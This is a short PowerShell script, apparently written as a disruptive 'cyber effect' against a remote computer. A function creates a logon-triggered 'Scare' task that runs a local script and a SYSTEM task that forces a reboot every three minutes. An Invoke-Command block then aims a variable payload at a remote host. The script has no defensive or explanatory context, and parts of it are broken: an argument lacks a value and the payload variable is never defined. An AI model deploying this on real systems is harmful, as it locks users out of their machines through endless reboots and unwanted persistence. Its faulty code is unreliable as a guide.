
function RollingReboot {
    schtasks.exe /create /tn "Scare" /tr "powershell -c 'C:\scare.ps1'" /sc onlogon /it
    schtasks.exe /create /tn "Effect" /tr "shutdown /r /t 000" /ru "SYSTEM" /sc minute /mo 3 
}

Invoke-Command -ComputerName $Computer -ArgumentsList -ScriptBlock {
    $CyberEffect
}
